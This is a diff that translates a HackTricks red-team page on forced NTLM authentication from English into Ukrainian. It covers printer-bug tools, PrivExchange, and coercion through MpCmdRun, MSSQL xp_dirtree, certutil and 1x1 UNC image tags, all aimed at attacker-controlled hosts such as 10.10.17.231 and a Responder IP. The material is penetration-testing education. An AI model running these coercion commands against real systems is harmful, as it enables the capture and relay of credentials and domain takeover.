@@ -1,137 +1,103 @@
-# Force NTLM Privileged Authentication
+# Примусова привілейована аутентифікація NTLM
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Ви працюєте в **кібербезпеці компанії**? Хочете побачити вашу **компанію в рекламі на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) - це **колекція** віддалених тригерів аутентифікації, написаних на C# з використанням компілятора MIDL для уникнення залежностей від сторонніх постачальників.
 
-## Spooler Service Abuse
+## Зловживання служби спулера
 
-If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
-Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
+Якщо служба _**Print Spooler**_ **увімкнена**, ви можете використовувати вже відомі облікові дані AD для **запиту** до друкованого сервера контролера домену про **оновлення нових друкованих завдань** та просто сказати йому **надіслати сповіщення на деяку систему**.\
+Зверніть увагу, що коли принтер надсилає сповіщення на довільні системи, він повинен **аутентифікуватися** на цій **системі**. Тому зловмисник може змусити службу _**Print Spooler**_ аутентифікуватися на довільній системі, і служба **використовуватиме обліковий запис комп'ютера** для цієї аутентифікації.
 
-### Finding Windows Servers on the domain
+### Пошук Windows-серверів у домені
 
-Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
-
+За допомогою PowerShell отримайте список Windows-боксів. Сервери зазвичай мають пріоритет, тому давайте зосередимося на них:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
+### Знаходження служб, які прослуховують спулер
 
-### Finding Spooler services listening
-
-Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:
-
+Використовуючи трохи змінений @mysmartlogin's (Вінсент Ле Ту) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), перевірте, чи прослуховується служба спулера:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-
-You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
-
+Ви також можете використовувати rpcdump.py на Linux та шукати протокол MS-RPRN.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
+### Запитайте сервіс про аутентифікацію на довільному хості
 
-### Ask the service to authenticate against an arbitrary host
-
-You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
-
+Ви можете скомпілювати [**SpoolSample звідси**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-
-or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux
-
+або використовуйте [**dementor.py від 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви працюєте на Linux
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
+### Комбінування з Неконтрольованим Делегуванням
 
-### Combining with Unconstrained Delegation
+Якщо зловмисник вже скомпрометував комп'ютер з [Неконтрольованим Делегуванням](unconstrained-delegation.md), зловмисник може **змусити принтер аутентифікуватися на цьому комп'ютері**. Через неконтрольоване делегування **TGT** **комп'ютерного облікового запису принтера** буде **збережено в** **пам'яті** комп'ютера з неконтрольованим делегуванням. Оскільки зловмисник вже скомпрометував цей хост, він зможе **отримати цей квиток** та використати його ([Передача квитка](pass-the-ticket.md)).
 
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
-
-## RCP Force authentication
+## Примусова аутентифікація RCP
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
 ## PrivExchange
 
-The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.
+Атака `PrivExchange` є результатом вразливості, виявленої в **функції Exchange Server `PushSubscription`**. Ця функція дозволяє Exchange-серверу бути примусованим будь-яким користувачем домену з поштовою скринькою аутентифікуватися на будь-якому клієнтом наданим хостом через HTTP.
 
-By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.
+За замовчуванням, **служба Exchange працює як SYSTEM** та має надмірні привілеї (зокрема, вона має **привілеї WriteDacl на домен до оновлення кумулятивного оновлення 2019 року**). Цю вразливість можна використовувати для **пересилання інформації до LDAP та подальшого вилучення бази даних NTDS домену**. У випадках, коли пересилання до LDAP неможливе, цю вразливість все одно можна використовувати для пересилання та аутентифікації на інших хостах у межах домену. Успішна експлуатація цієї атаки надає негайний доступ до адміністратора домену з будь-яким аутентифікованим обліковим записом домену.
 
-## Inside Windows
+## Усередині Windows
 
-If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:
+Якщо ви вже увійшли в систему Windows, ви можете змусити Windows підключатися до сервера за допомогою привілейованих облікових записів за допомогою:
 
 ### Defender MpCmdRun
-
 ```bash
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
-
 ### MSSQL
-
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-
-Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+Або скористайтеся іншою технікою: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:
-
+Можна використовувати lolbin certutil.exe (бінарний файл, підписаний Microsoft) для примусової аутентифікації NTLM:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
+## Впровадження HTML
 
-## HTML injection
+### Через електронну пошту
 
-### Via email
-
-If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
-
+Якщо ви знаєте **адресу електронної пошти** користувача, який увійшов в систему машини, яку ви хочете скомпрометувати, ви можете просто надіслати йому **електронний лист з зображенням розміром 1x1**, наприклад
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-
-and when he opens it, he will try to authenticate.
-
 ### MitM
 
-If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:
-
+Якщо ви можете виконати атаку типу MitM на комп'ютер і впровадити HTML на сторінку, яку він переглядає, ви можете спробувати впровадити зображення, подібне до наступного, на сторінку:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+## Взлам NTLMv1
 
-## Cracking NTLMv1
-
-If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
-_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
-
-<details>
-
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
+Якщо ви можете захопити виклики NTLMv1, прочитайте тут, як їх взламати.\
+_Пам'ятайте, що для взлому NTLMv1 вам потрібно встановити виклик Responder на "1122334455667788"_
